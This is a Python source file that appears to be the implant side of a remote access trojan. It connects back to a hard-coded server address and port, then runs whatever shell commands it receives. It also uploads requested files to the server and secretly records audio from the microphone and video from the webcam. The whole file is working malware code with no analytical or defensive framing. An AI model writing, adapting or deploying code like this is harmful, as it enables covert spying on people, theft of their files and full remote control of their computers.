import socket
import subprocess
import os
import cv2
import sounddevice as sd
import numpy as np
import wave
import random

SERVER = "10.184.15.72"
PORT = 4040

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

current_dir = os.getcwd()

def record_audio(duration, filename=f"recorded_audio_{random.randint(1,100)}.wav"):
    try:
        print(f"[*] Recording audio for {duration} seconds...")
        fs = 44100  # Sampling frequency

        # Check available input device information
        device_info = sd.query_devices(kind="input")
        channels = min(device_info['max_input_channels'], 2)  # Use up to 2 channels, but respect the device's limit

        print(f"[*] Using {channels} channels for recording.")
        audio = sd.rec(int(duration * fs), samplerate=fs, channels=channels, dtype=np.int16)
        sd.wait()  # Wait until recording is finished

        # Save audio to a file
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)  # Use the actual number of channels
            wf.setsampwidth(2)  # 16-bit audio
            wf.setframerate(fs)
            wf.writeframes(audio.tobytes())
        
        print(f"[+] Audio recorded and saved to {filename}")
        return f'[+] Audio saved as {filename}'.encode()
    except Exception as e:
        return f'[-] Error: {str(e)}'.encode()


def record_camera(duration, filename="recorded_video.avi"):
    try:
        print(f"[*] Recording video for {duration} seconds...")
        cap = cv2.VideoCapture(0)  # Open the default camera
        if not cap.isOpened():
            return b"[-] Error: Unable to access camera"

        # Define the codec and create VideoWriter object
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

        frame_count = int(duration * 20)  # 20 FPS
        for _ in range(frame_count):
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)

        # Release resources
        cap.release()
        out.release()

        print(f"[+] Video recorded and saved to {filename}")
        return f'[+] Video saved as {filename}'.encode()
    except Exception as e:
        return f'[-] Error: {str(e)}'.encode()

while True:
    cmd = s.recv(1024).decode().strip()
    print(f'[+] received command: {cmd}')
    
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    if cmd.startswith('cd'):
        try:
            target_dir = cmd[3:].strip()
            if target_dir == "":
                target_dir = os.path.expanduser('~')
            os.chdir(target_dir)
            current_dir = os.getcwd()
            result = f'[+] Changed directory to {current_dir}'.encode()
        except Exception as e:
            result = f'[-] Error: {str(e)}'.encode()
    elif cmd.startswith('download'):
        try:
            file_path = cmd[9:].strip()
            if not os.path.isfile(file_path):
                s.send(b'ERROR: File not found')
            else:
                s.send(b'FILE_TRANSFER_START')  # Send file transfer indicator
                with open(file_path, 'rb') as f:
                    while chunk := f.read(4096):
                        s.send(chunk)
                s.send(b'FILE_TRANSFER_END')  # Indicate transfer is complete
        except Exception as e:
            s.send(f'ERROR: {str(e)}'.encode())
    elif cmd.startswith('record'):
        try:
            duration = int(cmd.split()[1])
            result = record_audio(duration)
        except Exception as e:
            result = f'[-] Error: {str(e)}'.encode()
    elif cmd.startswith('camera'):
        try:
            duration = int(cmd.split()[1])
            result = record_camera(duration)
        except Exception as e:
            result = f'[-] Error: {str(e)}'.encode()
    else:
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True, cwd=current_dir)
        except Exception as e:
            result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed'.encode()

    s.send(result)

s.close()
